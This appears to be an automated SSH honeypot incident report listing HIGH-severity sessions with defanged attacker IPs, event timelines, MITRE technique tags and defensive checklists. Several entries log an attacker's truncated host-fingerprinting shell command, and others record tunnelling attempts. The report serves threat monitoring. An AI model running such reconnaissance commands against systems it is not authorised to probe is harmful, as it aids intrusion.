| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-23 20:38:16` | `cowrie.session.connect` |
| `2026-08-23 20:38:16` | `cowrie.client.version` |
| `2026-08-23 20:38:16` | `cowrie.client.kex` |
| `2026-08-23 20:38:17` | `cowrie.login.success` |
| `2026-08-23 20:38:18` | `cowrie.session.params` |
| `2026-08-23 20:38:18` | `cowrie.command.input` |
| `2026-08-23 20:38:18` | `cowrie.command.input` |
| `2026-08-23 20:38:18` | `cowrie.command.input` |
| `2026-08-23 20:38:18` | `cowrie.command.input` |
| `2026-08-23 20:38:18` | `cowrie.command.input` |
| `2026-08-23 20:38:18` | `cowrie.command.success` |
| `2026-08-23 20:38:18` | `cowrie.command.input` |
| `2026-08-23 20:38:18` | `cowrie.command.input` |
| `2026-08-23 20:38:18` | `cowrie.command.input` |
| `2026-08-23 20:38:18` | `cowrie.command.input` |
| `2026-08-23 20:38:18` | `cowrie.log.closed` |
| `2026-08-23 20:38:18` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]71` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]71` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2c5e14011966

| Field | Detail |
|---|---|
| **Source IP** | `36.64.36[.]101` |
| **First Seen** | 2026-08-23 20:40 |
| **Last Seen** | 2026-08-23 20:40 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-23 20:40:11` | `cowrie.session.connect` |
| `2026-08-23 20:40:12` | `cowrie.client.version` |
| `2026-08-23 20:40:12` | `cowrie.client.kex` |
| `2026-08-23 20:40:15` | `cowrie.login.success` |
| `2026-08-23 20:40:15` | `cowrie.direct-tcpip.request` |
| `2026-08-23 20:40:20` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `36.64.36[.]101` to AbuseIPDB if not already reported
- [ ] Block `36.64.36[.]101` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7d5a665d4ecb

| Field | Detail |
|---|---|
| **Source IP** | `87.225.108[.]138` |
| **First Seen** | 2026-08-23 20:40 |
| **Last Seen** | 2026-08-23 20:40 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-23 20:40:21` | `cowrie.session.connect` |
| `2026-08-23 20:40:21` | `cowrie.client.version` |
| `2026-08-23 20:40:21` | `cowrie.client.kex` |
| `2026-08-23 20:40:23` | `cowrie.login.success` |
| `2026-08-23 20:40:24` | `cowrie.direct-tcpip.request` |
| `2026-08-23 20:40:28` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `87.225.108[.]138` to AbuseIPDB if not already reported
- [ ] Block `87.225.108[.]138` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b179707c33a6

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]71` |
| **First Seen** | 2026-08-23 20:40 |
| **Last Seen** | 2026-08-23 20:40 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-23 20:40:22` | `cowrie.session.connect` |
| `2026-08-23 20:40:22` | `cowrie.client.version` |
| `2026-08-23 20:40:22` | `cowrie.client.kex` |
| `2026-08-23 20:40:23` | `cowrie.login.success` |
| `2026-08-23 20:40:24` | `cowrie.session.params` |
| `2026-08-23 20:40:24` | `cowrie.command.input` |
| `2026-08-23 20:40:24` | `cowrie.command.input` |
| `2026-08-23 20:40:24` | `cowrie.command.input` |
| `2026-08-23 20:40:24` | `cowrie.command.input` |
| `2026-08-23 20:40:24` | `cowrie.command.input` |
| `2026-08-23 20:40:24` | `cowrie.command.success` |
| `2026-08-23 20:40:24` | `cowrie.command.input` |
| `2026-08-23 20:40:24` | `cowrie.command.input` |
| `2026-08-23 20:40:24` | `cowrie.command.input` |
| `2026-08-23 20:40:24` | `cowrie.command.input` |
| `2026-08-23 20:40:24` | `cowrie.log.closed` |
| `2026-08-23 20:40:24` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]71` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]71` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a714d2413ac9

| Field | Detail |
|---|---|
| **Source IP** | `176.204.246[.]72` |
| **First Seen** | 2026-08-23 20:41 |
| **Last Seen** | 2026-08-23 20:41 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-23 20:41:28` | `cowrie.session.connect` |
| `2026-08-23 20:41:29` | `cowrie.client.version` |
| `2026-08-23 20:41:29` | `cowrie.client.kex` |
| `2026-08-23 20:41:30` | `cowrie.login.success` |
| `2026-08-23 20:41:31` | `cowrie.direct-tcpip.request` |
| `2026-08-23 20:41:36` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `176.204.246[.]72` to AbuseIPDB if not already reported
- [ ] Block `176.204.246[.]72` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-85b6c70de512

| Field | Detail |
|---|---|
| **Source IP** | `60.173.105[.]206` |
| **First Seen** | 2026-08-23 20:41 |
| **Last Seen** | 2026-08-23 20:41 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-23 20:41:36` | `cowrie.session.connect` |
| `2026-08-23 20:41:37` | `cowrie.client.version` |
| `2026-08-23 20:41:37` | `cowrie.client.kex` |
| `2026-08-23 20:41:39` | `cowrie.login.success` |
| `2026-08-23 20:41:40` | `cowrie.direct-tcpip.request` |
| `2026-08-23 20:41:44` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `60.173.105[.]206` to AbuseIPDB if not already reported
- [ ] Block `60.173.105[.]206` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-aebbf50acdaa

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]71` |
| **First Seen** | 2026-08-23 20:42 |
| **Last Seen** | 2026-08-23 20:42 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-23 20:42:28` | `cowrie.session.connect` |
| `2026-08-23 20:42:28` | `cowrie.client.version` |
| `2026-08-23 20:42:28` | `cowrie.client.kex` |
| `2026-08-23 20:42:29` | `cowrie.login.success` |
| `2026-08-23 20:42:30` | `cowrie.session.params` |
| `2026-08-23 20:42:30` | `cowrie.command.input` |
| `2026-08-23 20:42:30` | `cowrie.command.input` |
| `2026-08-23 20:42:30` | `cowrie.command.input` |
| `2026-08-23 20:42:30` | `cowrie.command.input` |
| `2026-08-23 20:42:30` | `cowrie.command.input` |
| `2026-08-23 20:42:30` | `cowrie.command.success` |
| `2026-08-23 20:42:30` | `cowrie.command.input` |
| `2026-08-23 20:42:30` | `cowrie.command.input` |
| `2026-08-23 20:42:30` | `cowrie.command.input` |
| `2026-08-23 20:42:30` | `cowrie.command.input` |
| `2026-08-23 20:42:31` | `cowrie.log.closed` |
| `2026-08-23 20:42:31` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]71` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]71` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-adda228c56e1

| Field | Detail |
|---|---|
| **Source IP** | `217.60.255[.]130` |
| **First Seen** | 2026-08-23 20:45 |
| **Last Seen** | 2026-08-23 20:45 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-23 20:45:46` | `cowrie.session.connect` |
| `2026-08-23 20:45:46` | `cowrie.client.version` |
| `2026-08-23 20:45:46` | `cowrie.client.kex` |
| `2026-08-23 20:45:47` | `cowrie.login.success` |
| `2026-08-23 20:45:47` | `cowrie.direct-tcpip.request` |
| `2026-08-23 20:45:47` | `cowrie.direct-tcpip.ja4h` |
| `2026-08-23 20:45:47` | `cowrie.direct-tcpip.data` |
| `2026-08-23 20:45:47` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.60.255[.]130` to AbuseIPDB if not already reported
- [ ] Block `217.60.255[.]130` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-91cc8069dde3

| Field | Detail |
|---|---|
| **Source IP** | `217.60.255[.]130` |
| **First Seen** | 2026-08-23 20:45 |
| **Last Seen** | 2026-08-23 20:45 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-23 20:45:49` | `cowrie.session.connect` |
| `2026-08-23 20:45:49` | `cowrie.client.version` |
| `2026-08-23 20:45:49` | `cowrie.client.kex` |
| `2026-08-23 20:45:50` | `cowrie.login.success` |
| `2026-08-23 20:45:50` | `cowrie.direct-tcpip.request` |
| `2026-08-23 20:45:50` | `cowrie.direct-tcpip.ja4h` |
| `2026-08-23 20:45:50` | `cowrie.direct-tcpip.data` |
| `2026-08-23 20:45:51` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.60.255[.]130` to AbuseIPDB if not already reported
- [ ] Block `217.60.255[.]130` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-75cc31366868

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]71` |
| **First Seen** | 2026-08-23 20:46 |
| **Last Seen** | 2026-08-23 20:46 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-23 20:46:06` | `cowrie.session.connect` |
| `2026-08-23 20:46:06` | `cowrie.client.version` |
| `2026-08-23 20:46:06` | `cowrie.client.kex` |
| `2026-08-23 20:46:06` | `cowrie.login.success` |
| `2026-08-23 20:46:07` | `cowrie.session.params` |
| `2026-08-23 20:46:07` | `cowrie.command.input` |
| `2026-08-23 20:46:07` | `cowrie.command.input` |
| `2026-08-23 20:46:07` | `cowrie.command.input` |
| `2026-08-23 20:46:07` | `cowrie.command.input` |
| `2026-08-23 20:46:07` | `cowrie.command.input` |
| `2026-08-23 20:46:07` | `cowrie.command.success` |
| `2026-08-23 20:46:07` | `cowrie.command.input` |
| `2026-08-23 20:46:07` | `cowrie.command.input` |
| `2026-08-23 20:46:07` | `cowrie.command.input` |
| `2026-08-23 20:46:07` | `cowrie.command.input` |
| `2026-08-23 20:46:07` | `cowrie.log.closed` |
| `2026-08-23 20:46:08` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]71` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]71` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2eb246986c8e

| Field | Detail |
|---|---|
| **Source IP** | `113.108.144[.]34` |
| **First Seen** | 2026-08-23 20:46 |
| **Last Seen** | 2026-08-23 20:46 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-23 20:46:35` | `cowrie.session.connect` |
| `2026-08-23 20:46:35` | `cowrie.client.version` |
| `2026-08-23 20:46:35` | `cowrie.client.kex` |
| `2026-08-23 20:46:38` | `cowrie.login.success` |
| `2026-08-23 20:46:38` | `cowrie.direct-tcpip.request` |
| `2026-08-23 20:46:43` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `113.108.144[.]34` to AbuseIPDB if not already reported
- [ ] Block `113.108.144[.]34` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-21577117c313

| Field | Detail |
|---|---|
| **Source IP** | `110.25.107[.]25` |
| **First Seen** | 2026-08-23 20:46 |
| **Last Seen** | 2026-08-23 20:46 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-23 20:46:44` | `cowrie.session.connect` |
| `2026-08-23 20:46:44` | `cowrie.client.version` |
| `2026-08-23 20:46:44` | `cowrie.client.kex` |
| `2026-08-23 20:46:46` | `cowrie.login.success` |
| `2026-08-23 20:46:46` | `cowrie.direct-tcpip.request` |
| `2026-08-23 20:46:51` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `110.25.107[.]25` to AbuseIPDB if not already reported
- [ ] Block `110.25.107[.]25` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ef284c07bdae

| Field | Detail |
|---|---|
| **Source IP** | `176.53.159[.]196` |
| **First Seen** | 2026-08-23 20:47 |
| **Last Seen** | 2026-08-23 20:47 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-23 20:47:58` | `cowrie.session.connect` |
| `2026-08-23 20:47:58` | `cowrie.client.version` |
| `2026-08-23 20:47:58` | `cowrie.client.kex` |
| `2026-08-23 20:47:58` | `cowrie.login.success` |
| `2026-08-23 20:47:58` | `cowrie.direct-tcpip.request` |
| `2026-08-23 20:47:58` | `cowrie.direct-tcpip.data` |
| `2026-08-23 20:47:58` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `176.53.159[.]196` to AbuseIPDB if not already reported
- [ ] Block `176.53.159[.]196` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-73afc89822eb

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]71` |
| **First Seen** | 2026-08-23 20:48 |
| **Last Seen** | 2026-08-23 20:48 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-23 20:48:00` | `cowrie.session.connect` |
| `2026-08-23 20:48:00` | `cowrie.client.version` |
| `2026-08-23 20:48:00` | `cowrie.client.kex` |
| `2026-08-23 20:48:01` | `cowrie.login.success` |
| `2026-08-23 20:48:01` | `cowrie.session.params` |
| `2026-08-23 20:48:01` | `cowrie.command.input` |
| `2026-08-23 20:48:01` | `cowrie.command.input` |
| `2026-08-23 20:48:01` | `cowrie.command.input` |
| `2026-08-23 20:48:01` | `cowrie.command.input` |
| `2026-08-23 20:48:01` | `cowrie.command.input` |
| `2026-08-23 20:48:02` | `cowrie.command.success` |
| `2026-08-23 20:48:02` | `cowrie.command.input` |
| `2026-08-23 20:48:02` | `cowrie.command.input` |
| `2026-08-23 20:48:02` | `cowrie.command.input` |
| `2026-08-23 20:48:02` | `cowrie.command.input` |
| `2026-08-23 20:48:02` | `cowrie.log.closed` |
| `2026-08-23 20:48:02` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]71` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]71` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-110ce1593a10

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]71` |
| **First Seen** | 2026-08-23 20:49 |
| **Last Seen** | 2026-08-23 20:49 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-23 20:49:52` | `cowrie.session.connect` |
| `2026-08-23 20:49:52` | `cowrie.client.version` |
| `2026-08-23 20:49:52` | `cowrie.client.kex` |
| `2026-08-23 20:49:53` | `cowrie.login.success` |
| `2026-08-23 20:49:54` | `cowrie.session.params` |
| `2026-08-23 20:49:54` | `cowrie.command.input` |
| `2026-08-23 20:49:54` | `cowrie.command.input` |
| `2026-08-23 20:49:54` | `cowrie.command.input` |
| `2026-08-23 20:49:54` | `cowrie.command.input` |
| `2026-08-23 20:49:54` | `cowrie.command.input` |
| `2026-08-23 20:49:54` | `cowrie.command.success` |
| `2026-08-23 20:49:54` | `cowrie.command.input` |
| `2026-08-23 20:49:54` | `cowrie.command.input` |
| `2026-08-23 20:49:54` | `cowrie.command.input` |
| `2026-08-23 20:49:54` | `cowrie.command.input` |
| `2026-08-23 20:49:54` | `cowrie.log.closed` |
| `2026-08-23 20:49:54` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]71` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]71` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-551d138b6356

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]71` |
| **First Seen** | 2026-08-23 20:51 |
| **Last Seen** | 2026-08-23 20:51 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-23 20:51:44` | `cowrie.session.connect` |
| `2026-08-23 20:51:44` | `cowrie.client.version` |
| `2026-08-23 20:51:44` | `cowrie.client.kex` |
| `2026-08-23 20:51:45` | `cowrie.login.success` |
| `2026-08-23 20:51:46` | `cowrie.session.params` |
| `2026-08-23 20:51:46` | `cowrie.command.input` |
| `2026-08-23 20:51:46` | `cowrie.command.input` |
| `2026-08-23 20:51:46` | `cowrie.command.input` |
| `2026-08-23 20:51:46` | `cowrie.command.input` |
| `2026-08-23 20:51:46` | `cowrie.command.input` |
| `2026-08-23 20:51:46` | `cowrie.command.success` |
| `2026-08-23 20:51:46` | `cowrie.command.input` |
| `2026-08-23 20:51:46` | `cowrie.command.input` |
| `2026-08-23 20:51:46` | `cowrie.command.input` |
| `2026-08-23 20:51:46` | `cowrie.command.input` |
| `2026-08-23 20:51:46` | `cowrie.log.closed` |
| `2026-08-23 20:51:46` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]71` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]71` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b6ea0d060a7a

| Field | Detail |
|---|---|
| **Source IP** | `201.28.176[.]31` |
| **First Seen** | 2026-08-23 20:52 |
| **Last Seen** | 2026-08-23 20:52 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-23 20:52:08` | `cowrie.session.connect` |
| `2026-08-23 20:52:09` | `cowrie.client.version` |
| `2026-08-23 20:52:09` | `cowrie.client.kex` |
| `2026-08-23 20:52:11` | `cowrie.login.success` |
| `2026-08-23 20:52:11` | `cowrie.direct-tcpip.request` |
| `2026-08-23 20:52:16` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `201.28.176[.]31` to AbuseIPDB if not already reported
- [ ] Block `201.28.176[.]31` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5310a490d502

| Field | Detail |
|---|---|
| **Source IP** | `39.164.94[.]190` |
| **First Seen** | 2026-08-23 20:52 |
| **Last Seen** | 2026-08-23 20:52 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-23 20:52:21` | `cowrie.session.connect` |
| `2026-08-23 20:52:22` | `cowrie.client.version` |
| `2026-08-23 20:52:22` | `cowrie.client.kex` |
| `2026-08-23 20:52:24` | `cowrie.login.success` |
| `2026-08-23 20:52:25` | `cowrie.direct-tcpip.request` |
| `2026-08-23 20:52:30` | `cowrie.session.closed` |

